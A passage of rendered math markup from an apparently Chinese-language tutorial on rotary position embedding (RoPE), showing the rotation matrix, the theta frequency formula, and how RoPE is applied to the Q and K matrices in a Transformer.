style="height:0.1166em;"><span/></span></span></span></span></span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">3</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">4</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">5</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">6</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mclose">]</span><span class="mord">...</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight">d</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight">d</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mclose">]</span></span></span></span></span>，然后依次进行下面的运算</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow></msubsup></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msubsup></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><mi>n</mi><msub><mi>θ</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>s</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><msub><mi>θ</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>s</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><msub><mi>θ</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><mi>n</mi><msub><mi>θ</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow></msubsup></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msubsup></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\begin{bmatrix}
x_{n}^{[i]}\\
x_{n}^{[i+1]}
\end{bmatrix} = \begin{bmatrix}
 cos(n\theta_{i} ) &amp; -sin(n\theta_{i} )
\\
 sin(n\theta_{i} ) &amp; cos(n\theta_{i} )
\end{bmatrix} \begin{bmatrix}
x_{n}^{[i]}
 \\
x_{n}^{[i+1]}
\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6548em;"><span style="top:-3.6548em;"><span class="pstrut" style="height:3.0448em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.0448em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.1548em;"><span/></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">]</span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">cos</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="mord mathnormal">in</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">−</span><span class="mord mathnormal">s</span><span class="mord mathnormal">in</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">cos</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6548em;"><span style="top:-3.6548em;"><span class="pstrut" style="height:3.0448em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.0448em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.1548em;"><span/></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">]</span></span></span></span></span></span></span></div>
<p>上式中的等号在算法实现中表示<strong>赋值更新</strong>操作，即用计算后的新值替换原向量中的对应元素。经过对每一组二维子向量依次进行上述变换后，我们便得到了 RoPE 变换后的新矩阵<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>X</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">X'</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span>。</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>θ</mi><mi>i</mi></msub><mo>=</mo><mn>1000</mn><msup><mn>0</mn><mrow><mo>−</mo><mfrac><mrow><mn>2</mn><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><mi>d</mi></mfrac></mrow></msup><mtext> </mtext><mo separator="true">,</mo><mtext> </mtext><mi>i</mi><mo>∈</mo><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mfrac><mi>d</mi><mn>2</mn></mfrac><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\theta_{i} = 10000^{-\frac{2(i-1)}{d} } \space , \space i \in [1,2,...,\frac{d}{2} ]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.3339em;vertical-align:-0.1944em;"/><span class="mord">1000</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.1395em;"><span style="top:-3.413em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0378em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span><span style="top:-3.2255em;"><span class="pstrut" style="height:3em;"/><span class="frac-line mtight" style="border-bottom-width:0.049em;"/></span><span style="top:-3.5021em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span/></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"/></span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.0574em;vertical-align:-0.686em;"/><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mclose">]</span></span></span></span></span></div>
<p>在Transformer中，只需要对编码器中的<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span></span></span></span></span>矩阵和<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span></span>矩阵进行RoPE变换(<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>=</mo><mi>R</mi><mi>o</mi><mi>P</mi><mi>E</mi><mo stretchy="false">(</mo><mi>Q</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>K</mi><mo>=</mo><mi>R</mi><mi>o</mi><mi>P</mi><mi>E</mi><mo stretchy="false">(</mo><mi>K</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Q = RoPE(Q),K = RoPE(K)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.05764em;">PE</span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.05764em;">PE</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span></span></span></span></span>)就行，其它的操作流程完全不变，注意<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></span>矩阵不需要进行RoPE变换，并且RoPE旋转位置编码应该在编码器的每一层都对<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span></span></span></span></span>和<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span></span>应用。这样就可以去掉原始论文的架构图上的位置编码操作了。</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>Q</mi><mo>=</mo><mi>X</mi><mo>⋅</mo><msub><mi>W</mi><mi>q</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>K</mi><mo>=</mo><mi>X</mi><mo>⋅</mo><msub><mi>W</mi><mi>k</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>V</mi><mo>=</mo><mi>X</mi><mo>⋅</mo><msub><mi>W</mi><mi>v</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{matrix}
Q = X\cdot W_{q} &amp; (seq\_len,k)
 \\
K = X\cdot W_{k} &amp; (seq\_len,k)
 \\
V = X\cdot W_{v} &amp; (seq\_len,out\_size) 
\end{matrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" 